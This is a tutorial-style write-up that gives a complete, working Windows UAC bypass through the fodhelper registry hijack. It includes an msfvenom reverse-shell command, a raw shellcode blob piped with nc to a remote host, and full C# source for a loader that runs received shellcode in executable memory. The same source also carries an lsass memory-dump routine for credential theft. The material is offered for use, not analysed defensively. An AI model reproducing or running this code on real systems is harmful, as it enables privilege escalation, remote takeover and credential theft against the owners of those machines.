# Getting elevated shell by bypassing UAC

Finally after 3 days of fails I can now bypass UAC automatically and get a elevated shell. This was the best complicated learning experience for Windows API.

# Steps!
- Generate shellcode for 64/32 bit depending upon your PC bitness.
```bash
sfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.122.1 LPORT=80 -a x64 -f csharp -b "\x00\x0a\x0d"
```
- Now run the [UAC.exe](../exe/UAC.exe) executable and send shellcode over the tcp port
```bash
python -c 'print "\x48\x31\xc9\x48\x81\xe9\xc6\xff\xff\xff\x48\x8d\x05\xef\xff\xff\xff\x48\xbb\x1c\x82\x5e\xd6\x5e\x3f\xf8\xdc\x48\x31\x58\x27\x48\x2d\xf8\xff\xff\xff\xe2\xf4\xe0\xca\xdd\x32\xae\xd7\x38\xdc\x1c\x82\x1f\x87\x1f\x6f\xaa\x8d\x4a\xca\x6f\x04\x3b\x77\x73\x8e\x7c\xca\xd5\x84\x46\x77\x73\x8e\x3c\xca\xd5\xa4\x0e\x77\xf7\x6b\x56\xc8\x13\xe7\x97\x77\xc9\x1c\xb0\xbe\x3f\xaa\x5c\x13\xd8\x9d\xdd\x4b\x53\x97\x5f\xfe\x1a\x31\x4e\xc3\x0f\x9e\xd5\x6d\xd8\x57\x5e\xbe\x16\xd7\x8e\xb4\x78\x54\x1c\x82\x5e\x9e\xdb\xff\x8c\xbb\x54\x83\x8e\x86\xd5\x77\xe0\x98\x97\xc2\x7e\x9f\x5f\xef\x1b\x8a\x54\x7d\x97\x97\xd5\x0b\x70\x94\x1d\x54\x13\xe7\x97\x77\xc9\x1c\xb0\xc3\x9f\x1f\x53\x7e\xf9\x1d\x24\x62\x2b\x27\x12\x3c\xb4\xf8\x14\xc7\x67\x07\x2b\xe7\xa0\x98\x97\xc2\x7a\x9f\x5f\xef\x9e\x9d\x97\x8e\x16\x92\xd5\x7f\xe4\x95\x1d\x52\x1f\x5d\x5a\xb7\xb0\xdd\xcc\xc3\x06\x97\x06\x61\xa1\x86\x5d\xda\x1f\x8f\x1f\x65\xb0\x5f\xf0\xa2\x1f\x84\xa1\xdf\xa0\x9d\x45\xd8\x16\x5d\x4c\xd6\xaf\x23\xe3\x7d\x03\x9f\xe0\x48\x8b\xee\x43\xb1\x6c\xd6\x5e\x7e\xae\x95\x95\x64\x16\x57\xb2\x9f\xf9\xdc\x1c\xcb\xd7\x33\x17\x83\xfa\xdc\x1c\xd2\x9e\x7e\x24\x3e\xb9\x88\x55\x0b\xba\x9a\xd7\xce\xb9\x66\x50\xf5\x78\xd1\xa1\xea\xb4\x55\xf6\xea\x5f\xd7\x5e\x3f\xa1\x9d\xa6\xab\xde\xbd\x5e\xc0\x2d\x8c\x4c\xcf\x6f\x1f\x13\x0e\x38\x94\xe3\x42\x16\x5f\x9c\x77\x07\x1c\x54\x0b\x9f\x97\xe4\xd5\xf7\x03\xfc\x7d\x8b\x9e\xd7\xf8\x92\xcc\x5d\xda\x12\x5f\xbc\x77\x71\x25\x5d\x38\xc7\x73\x2a\x5e\x07\x09\x54\x03\x9a\x96\x5c\x3f\xf8\x95\xa4\xe1\x33\xb2\x5e\x3f\xf8\xdc\x1c\xc3\x0e\x97\x0e\x77\x71\x3e\x4b\xd5\x09\x9b\x6f\xff\x92\xd1\x45\xc3\x0e\x34\xa2\x59\x3f\x98\x38\xd6\x5f\xd7\x16\xb2\xbc\xf8\x04\x44\x5e\xbe\x16\xb6\x1e\x8a\x4c\xc3\x0e\x97\x0e\x7e\xa8\x95\xe3\x42\x1f\x86\x17\xc0\x30\x91\x95\x43\x12\x5f\x9f\x7e\x42\xa5\xd0\xbd\xd8\x29\x8b\x77\xc9\x0e\x54\x7d\x94\x5d\x50\x7e\x42\xd4\x9b\x9f\x3e\x29\x8b\x84\x08\x69\xbe\xd4\x1f\x6c\xf8\xaa\x45\x41\xe3\x57\x16\x55\x9a\x17\xc4\xda\x60\x88\xde\x2d\xbe\x4a\xfd\x67\x5b\x91\x2c\xb9\x34\x3f\xa1\x9d\x95\x58\xa1\x03\x5e\x3f\xf8\xdc"' | nc 192.168.122.189 8080
```
- Boom! You have elevated reverse shell on port 80 

# Things to take care of!

- Download [UAC.exe](../exe/UAC.exe) in `C:\Windows\Temp` and download [Execute.exe](../exe/execute.exe) also in `C:\Windows\Temp` since its actually execute.exe which extracts the shellcode from shared memory and executes it in elevated context.
- The exe are 64 compiled for 64 bit
- Enjoy!

# CODE

Code for UAC.exe
```C#
using System;
using System.Management;
using System.IO;
using System.IO.Pipes;
using System.Diagnostics;
using System.Net.Sockets;
using System.Net;   
using System.Runtime.InteropServices;
using Microsoft.Win32;
using System.IO.MemoryMappedFiles;
using System.Threading;

class Program
{
    [DllImport("kernel32")]
    private static extern IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress, UInt64 dwSize, UInt64 flAllocationType, UInt64 flProtect);

    [DllImport("kernel32")]
    private static extern IntPtr OpenProcess(UInt64 dwDesiredAccess, bool bInheritHandle, UInt64 dwProcessId);

    [DllImport("dbghelp")]
    private static extern bool MiniDumpWriteDump(IntPtr hProcess, UInt64 ProcessId, SafeHandle hFile, UInt64 dumpType, IntPtr ExceptionParam, IntPtr UserStreamParam, IntPtr CallbackParam);

    private static UInt64 DELTE = 0x10000;
    private static UInt64 READ_CONTROL = 0x20000;
    private static UInt64 WRITE_DAC = 0x40000;
    private static UInt64 WRITE_OWNER = 0x80000;
    private static UInt64 SYNCHRONIZE = 0x1000000;
    private static UInt64 END = 0xFFF;
    private static UInt64 PROCESS_ALL_ACCESS = (DELTE | READ_CONTROL | WRITE_DAC | WRITE_OWNER | SYNCHRONIZE | END);

    //Perform UAC bypass using fodhelper
    static void ByPassUAC(string command)
    {
        //UAC Bypass using fodhelper.exe
        //REG ADD HKCU\Software\Classes\ms - settings\Shell\Open\command
        //REG ADD HKCU\Software\Classes\ms - settings\Shell\Open\command / v DelegateExecute / t REG_SZ
        //REG ADD HKCU\Software\Classes\ms - settings\Shell\Open\command / d "cmd.exe" / f

        RegistryKey myKey = Registry.CurrentUser.OpenSubKey("Software\\Classes\\ms-settings\\shell\\open\\command");
        if (myKey == null)
        {
            RegistryKey tmpKey = Registry.CurrentUser.CreateSubKey(@"Software\\Classes\\ms-settings\\shell\\open\\command");
            tmpKey.Close();
        }
        myKey.Close();
        RegistryKey Key = Registry.CurrentUser.OpenSubKey("Software\\Classes\\ms-settings\\shell\\open\\command",true);
        Key.SetValue("DelegateExecute", "REG_SZ");
        Key.SetValue("", command);
        return;
    }

    //Start a fodhelper.exe process
    static Process ActivateProcess(string name)
    {
        Process p = new Process();
        p.StartInfo.CreateNoWindow = true;
        p.StartInfo.FileName = name;
        p.Start();
        return p;
    }

    static void ExecuteInProcess(Process client)
    {
        using(AnonymousPipeServerStream pipeServer = new AnonymousPipeServerStream(PipeDirection.Out, HandleInheritability.Inheritable))
        {
            client.StartInfo.Arguments = pipeServer.GetClientHandleAsString();
            client.StartInfo.UseShellExecute = false;
            
            client.Start();

            pipeServer.DisposeLocalCopyOfClientHandle();
        }
    }

    static void ReverShell(MemoryMappedFile mmf,AutoResetEvent handle)
    {
        IPHostEntry ipHost = Dns.GetHostEntry(Dns.GetHostName());
        IPAddress ipAddress = ipHost.AddressList[1];
        IPEndPoint localEndpoint = new IPEndPoint(ipAddress, 8080);

        Socket s = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);
        s.Bind(localEndpoint);
        s.Listen(5);

        // Accept incomming connection
        Socket handler = s.Accept();
        byte[] bytes = new byte[1024];
        byte[] shellcode;

        //Save the incomming bytes to a byte array to execute
        while (true)
        {
            int bytesRec = handler.Receive(bytes);
            shellcode = new byte[bytesRec];
            Buffer.BlockCopy(bytes, 0, shellcode, 0, bytesRec);
            break;
        }

        MemoryMappedViewStream stream = mmf.CreateViewStream(0,4+shellcode.Length-1);
        stream.Seek(0, SeekOrigin.Begin);
        byte[] length = BitConverter.GetBytes(shellcode.Length - 1);
        stream.Write(length,0,length.Length);
        stream.Write(shellcode, 0, shellcode.Length-1);
        handle.Set();
        while (true) ;
    }

    //Return the process id the process spawned by running fodhelper.exe i.e the cmd.exe running with elevated privs.
    // Refer : https://stackoverflow.com/questions/17922725/monitor-child-processes-of-a-process
    static IntPtr GetChildProcess(Process parentProcess)
    {
        int i = 0;
        ManagementObjectSearcher mo = new ManagementObjectSearcher(String.Format("Select * from Win32_Process Where ParentProcessID={0}", parentProcess.Id));
        foreach(ManagementObject m in mo.Get()){
            i = Convert.ToInt32(m["ProcessID"]);
        }
        if (i == 0)
        {
            System.Console.WriteLine("[!] Error getting the child process handle");
            return IntPtr.Zero;
        }
        else
        {
            IntPtr child = OpenProcess(PROCESS_ALL_ACCESS, false, (UInt64)i);
            return child;
        }
    }

    static void WriteMem(Process p)
    {
        FileStream fs = new FileStream("lsass.dat", FileMode.Create);

        bool status = MiniDumpWriteDump(p.Handle, (UInt64)p.Id, fs.SafeFileHandle, (UInt64)2, IntPtr.Zero, IntPtr.Zero, IntPtr.Zero);
        if (status)
        {
            System.Console.WriteLine("Done!");
            fs.Close();
            System.Console.ReadLine();
        }
        else
        {
            System.Console.WriteLine("[!] Error dumping the process");
        }
        return;
    }

    static void MemoryMappingForIPC(AutoResetEvent handle)
    {
        MemoryMappedFile mmf = MemoryMappedFile.CreateNew("shellcode", 500, MemoryMappedFileAccess.ReadWrite);
        ReverShell(mmf,handle);

    }

    static void ExecuteUAC()
    {
        ByPassUAC("C:\\Windows\\Temp\\Execute.exe");
        Process p = ActivateProcess("C:\\Windows\\System32\\fodhelper.exe");
    }

    static void Main(string[] args)
    {
        AutoResetEvent waitHandle = new AutoResetEvent(false);
        Thread t1 = new Thread(new ThreadStart(() => MemoryMappingForIPC(waitHandle)));
        t1.Start();
        Thread t2 = new Thread(new ThreadStart(ExecuteUAC));
        waitHandle.WaitOne();
        t2.Start();
        waitHandle.Dispose();
//        WriteMem(p);
    }
}
```


Code for Execute.exe
```c#
using System.Runtime.InteropServices;
using System;
using System.Net.Sockets;
using System.Net;

class Program
{

    [DllImport("kernel32")]
    private static extern IntPtr VirtualAlloc(UInt32 lpAddress, UInt32 dWsize, UInt32 flAllocationType, UInt32 flProtect);

    [DllImport("kernel32")]
    private static extern IntPtr CreateThread(UInt32 lpThreadAttributes, UInt32 dWsize, IntPtr lpStartAddress, IntPtr lpParameter, UInt32 dwCreationFlags, IntPtr lpThradId);

    [DllImport("kernel32")]
    private static extern UInt32 WaitForSingleObject(IntPtr hHandle, UInt32 dwMilliSeconds);

    private static UInt32 MEM_COMMIT = 0x1000;
    private static UInt32 PAGE_EXECUTE_READWRITE = 0x40;

    static void Main(string[] args)
    {


        IPHostEntry ipHost = Dns.GetHostEntry(Dns.GetHostName());
        IPAddress ipAddress = ipHost.AddressList[1];
        IPEndPoint localEndpoint = new IPEndPoint(ipAddress, 8080);

        Socket s = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);
        s.Bind(localEndpoint);
        s.Listen(5);

        Socket handler = s.Accept();
        byte[] bytes = new byte[1024];
        byte[] shellcode;

        while (true)
        {
            int bytesRec = handler.Receive(bytes);
            if (bytesRec < 1024)
            {
                shellcode = new byte[bytesRec];
                Buffer.BlockCopy(bytes, 0, shellcode, 0, bytesRec);
                break;
            }
        }

        IntPtr address = VirtualAlloc(0, (UInt32)(shellcode.Length - 1), MEM_COMMIT, PAGE_EXECUTE_READWRITE);
        Marshal.Copy(shellcode, 0, address, shellcode.Length - 1);
        IntPtr threadHandle = CreateThread(0, 0, address, IntPtr.Zero, 0, IntPtr.Zero);
        WaitForSingleObject(threadHandle, 0xFFFFFFFF);
    }
}
```

For technical details refer [day6](../days/day6.md)
